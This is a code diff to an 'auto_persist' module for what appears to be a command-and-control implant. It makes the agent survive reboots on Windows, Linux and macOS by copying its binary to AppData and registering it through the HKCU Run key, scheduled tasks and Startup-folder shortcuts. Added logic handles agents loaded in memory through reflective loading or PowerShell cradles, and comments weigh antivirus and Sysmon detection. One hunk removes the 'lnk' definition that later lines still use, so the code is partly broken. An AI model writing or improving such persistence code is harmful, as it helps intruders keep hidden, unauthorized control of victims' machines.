@@ -54,6 +54,20 @@ if args.len() > 0 {
     }
 }
 
+// Optional second argument: explicit path to the agent binary.
+// Required when the agent runs in-memory (inside powershell.exe, cmd.exe,
+// or another interpreter process) because auto-detection returns the
+// host process, not the agent itself.
+//   ext:load auto_persist MyLabel C:\Users\user\agent.exe
+let CUSTOM_BINARY = "";
+if args.len() > 1 {
+    let cb = args[1];
+    cb.trim();
+    if cb.len() > 3 {
+        CUSTOM_BINARY = cb;
+    }
+}
+
 // ── Platform detection ────────────────────────────────────────────────
 let is_windows = internal_env("SystemRoot").contains("Windows");
 let uname      = exec_os("uname -s 2>/dev/null");
@@ -63,37 +77,66 @@ let platform   = if is_windows { "windows" } else if is_macos { "macos" } else {
 
 print_log("[auto_persist] platform=" + platform + "  label=" + LABEL);
 
-// ── Locate the running binary ─────────────────────────────────────────
-let self_path = "";
 
-if is_windows {
-    self_path = exec_os(
-        "powershell -NoProfile -NonInteractive -Command " +
-        "\"[System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName\""
-    );
-    self_path.replace("\r\n", "");
-    self_path.replace("\r",   "");
-    self_path.replace("\n",   "");
-    self_path.trim();
-} else if is_linux {
-    self_path = exec_os("readlink -f /proc/self/exe 2>/dev/null");
-    self_path.trim();
-} else {
-    // macOS: exec_os child shell's $PPID == agent PID
-    self_path = exec_os(
-        "lsof -p $PPID 2>/dev/null | awk '$4==\"txt\" && $5==\"REG\" {print $NF}' | head -1"
-    );
-    self_path.trim();
-    if self_path.len() < 3 || self_path.contains("Error") {
-        self_path = exec_os("ps -p $PPID -o comm= 2>/dev/null");
-        self_path.trim();
-    }
-}
+// ── Locate the running binary ─────────────────────────────────────────
+// internal_self_path() calls std::env::current_exe() in the agent process
+// directly — no subprocess, works on all platforms.  DO NOT use exec_os
+// subprocess tricks here: /proc/self/exe inside an exec_os child points
+// to the child binary (e.g. readlink), not the agent.  On Windows the
+// nested powershell returns powershell.exe.  On macOS $PPID varies.
+let self_path = "";
+self_path = internal_self_path();
+self_path.trim();
 
 if self_path.len() < 3 || self_path.contains("Error") {
     return "{\"result\":\"error\"," +
            "\"detail\":\"Could not determine agent binary path\"," +
-           "\"platform\":\"" + platform + "\"}";
+           "\"platform\":\"" + platform + "\"}"; 
+}
+
+// Apply operator-supplied binary path override (needed for in-memory agents).
+if CUSTOM_BINARY.len() > 3 {
+    self_path = CUSTOM_BINARY;
+    print_log("[auto_persist] binary overridden by arg: " + self_path);
+}
+
+// ── Interpreter / system-binary guard ────────────────────────────────
+// If self_path is a known host interpreter or a Windows system binary
+// the agent is running in-memory (reflective load, IEX cradle, etc.).
+// Copying powershell.exe / cmd.exe as the "agent" is meaningless.
+// Abort with a clear error and instruct the operator to pass the
+// agent EXE path explicitly as the second argument.
+let is_interpreter = false;
+if is_windows {
+    is_interpreter =
+        self_path.contains("\\Windows\\System32\\")  ||
+        self_path.contains("\\Windows\\SysWOW64\\")  ||
+        self_path.contains("\\Windows\\sysnative\\") ||
+        self_path.ends_with("powershell.exe")         ||
+        self_path.ends_with("PowerShell.exe")         ||
+        self_path.ends_with("powershell_ise.exe")     ||
+        self_path.ends_with("cmd.exe")                ||
+        self_path.ends_with("wscript.exe")            ||
+        self_path.ends_with("cscript.exe")            ||
+        self_path.ends_with("mshta.exe")              ||
+        self_path.ends_with("rundll32.exe");
+}
+if is_linux || is_macos {
+    is_interpreter =
+        self_path == "/bin/bash"     || self_path == "/usr/bin/bash"   ||
+        self_path == "/bin/sh"       || self_path == "/usr/bin/sh"     ||
+        self_path == "/bin/python3"  || self_path.contains("/python3") ||
+        self_path.contains("/python2") || self_path.contains("/python") ||
+        self_path == "/usr/bin/perl" || self_path.contains("/perl");
+}
+if is_interpreter && CUSTOM_BINARY.len() < 3 {
+    let sb_e = self_path;
+    return "{\"result\":\"error\"," +
+           "\"detail\":\"Agent is running inside a host process (\" + sb_e + \"). " +
+           "Provide the agent EXE path as a second argument: " +
+           "ext:load auto_persist " + LABEL + " C:\\\\path\\\\to\\\\agent.exe\"," +
+           "\"platform\":\"" + platform + "\"," +
+           "\"binary\":\"" + sb_e + "\"}";
 }
 
 print_log("[auto_persist] binary=" + self_path);
@@ -101,8 +144,17 @@ print_log("[auto_persist] binary=" + self_path);
 // ── Privilege detection ───────────────────────────────────────────────
 let is_elevated = false;
 if is_windows {
-    let groups = exec_os("whoami /groups 2>nul");
-    is_elevated = groups.contains("S-1-16-12288");
+    // PowerShell-native elevation check — fast, no WMI, no network calls.
+    // exec_os already runs through PowerShell on Windows so this is a single
+    // PS process call.  `whoami /groups` blocks for 2-5 minutes on
+    // domain-joined machines waiting for a DC; do not use it here.
+    let elev_str = exec_os_timeout(
+        "([Security.Principal.WindowsPrincipal]" +
+        "[Security.Principal.WindowsIdentity]::GetCurrent())" +
+        ".IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)",
+        10
+    );
+    is_elevated = elev_str.contains("True");
 } else {
     let _uid = exec_os("id -u 2>/dev/null");
     _uid.trim();
@@ -144,8 +196,21 @@ if is_windows {
     if self_path == stable_path {
         stable_ok = true;
     } else {
-        exec_os("copy /y \"" + self_path + "\" \"" + stable_path + "\" >nul 2>&1");
-        let chk = exec_os("cmd /c \"if exist \\\"" + stable_path + "\\\" echo OK\"");
+        // Ensure the destination directory exists.
+        // Use PowerShell natively (spawn_shell already wraps exec_os in PS).
+        let dest_dir = appdata + "\\\\Microsoft";
+        exec_os_timeout(
+            "if (-not (Test-Path -LiteralPath '" + dest_dir + "')) " +
+            "{ New-Item -ItemType Directory -Path '" + dest_dir + "' -Force | Out-Null }",
+            10
+        );
+
+        // Copy binary to stable location using PowerShell cmdlets.
+        exec_os_timeout(
+            "Copy-Item -LiteralPath '" + self_path + "' -Destination '" + stable_path + "' -Force 2>$null",
+            30
+        );
+        let chk = exec_os_timeout("if (Test-Path -LiteralPath '" + stable_path + "') { 'OK' }", 5);
         stable_ok = chk.contains("OK");
     }
 
@@ -198,8 +263,8 @@ print_log("[auto_persist] stable_path=" + stable_path);
 let already = "";
 
 if is_windows {
-    let run_q = exec_os("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" + LABEL + "\" 2>nul");
-    let tsk_q = exec_os("schtasks /query /tn \"" + LABEL + "\" 2>nul");
+    let run_q = exec_os_timeout("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" + LABEL + "\" 2>$null", 8);
+    let tsk_q = exec_os_timeout("schtasks /query /tn \"" + LABEL + "\" 2>$null", 10);
     if run_q.contains(LABEL) { already = "registry_run_hkcu"; }
     if already == "" && tsk_q.contains(LABEL) { already = "scheduled_task"; }
 } else if is_linux {
@@ -295,16 +360,13 @@ if is_windows {
     // No elevation.  Widely scanned by AV — last resort before HKLM.
     // Noise: HIGH.  Detection: Sysmon 11 (file create in startup path).
     if success_method == "" {
-        let startup = exec_os(
-            "powershell -NoProfile -Command \"[Environment]::GetFolderPath('Startup')\""
-        );
+        let startup = exec_os_timeout("[Environment]::GetFolderPath('Startup')", 5);
         startup.trim(); startup.replace("\r\n",""); startup.replace("\n","");
-        let lnk = startup + "\\" + LABEL + ".lnk";
         let ps_cmd =
             "$s=(New-Object -COM WScript.Shell).CreateShortcut('" + lnk +
             "');$s.TargetPath='" + stable_path + "';$s.Save()";
-        exec_os("powershell -NoProfile -Command \"" + ps_cmd + "\" 2>&1");
-        let chk = exec_os("cmd /c \"if exist \\\"" + lnk + "\\\" echo EXISTS\" 2>nul");
+        exec_os_timeout(ps_cmd + " 2>$null", 15);
+        let chk = exec_os_timeout("if (Test-Path -LiteralPath '" + lnk + "') { 'EXISTS' }", 5);
         let ok  = chk.contains("EXISTS");
         let det = if ok { lnk + " → " + stable_path } else { "shortcut create failed" };
         det.replace("\"", "'");
